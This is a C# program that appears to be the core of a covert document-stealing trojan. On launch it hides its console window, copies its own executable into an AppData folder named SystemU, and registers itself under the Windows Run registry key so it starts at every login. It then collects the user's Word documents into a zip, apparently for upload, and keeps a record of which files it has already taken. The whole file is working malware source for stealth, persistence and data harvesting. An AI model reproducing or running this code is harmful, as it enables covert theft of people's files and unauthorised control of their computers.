using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Collections.Generic;

namespace systemU
{
    //[Serializable]
    //struct FileInfoToSaveinSystem
    //{
    //    string Path;
    //    public DateTime lastModified { get; set; }
    //}

    

    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);
            List<FileIO> UplodedFile = new List<FileIO>();
            if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak")))
                UplodedFile = ReadFromBinaryFile<List<FileIO>>(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak"));

                String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                rk.SetValue( Process.GetCurrentProcess().ProcessName, "\"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", fileName) + "\"" );
            
            
            if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", fileName)))
            {
                String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\"));
                File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\" , fileName));
            }
            //make zip file at c:\WindowsBt    
            new ZipMaker().makeZip(new FileGeter().forourWORK("*.doc*"), UplodedFile);
            WriteToBinaryFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SystemU\\", "bak.bak"),UplodedFile);
        }    
        
public static void WriteToBinaryFile<T>(string filePath, T objectToWrite, bool append = false)
{
    using (Stream stream = File.Open(filePath, append ? FileMode.Append : FileMode.Create))
    {
        var binaryFormatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
        binaryFormatter.Serialize(stream, objectToWrite);
    }
}

public static T ReadFromBinaryFile<T>(string filePath)
{
    using (Stream stream = File.Open(filePath, FileMode.Open))
    {
        var binaryFormatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
        return (T)binaryFormatter.Deserialize(stream);
    }
}
    }
}
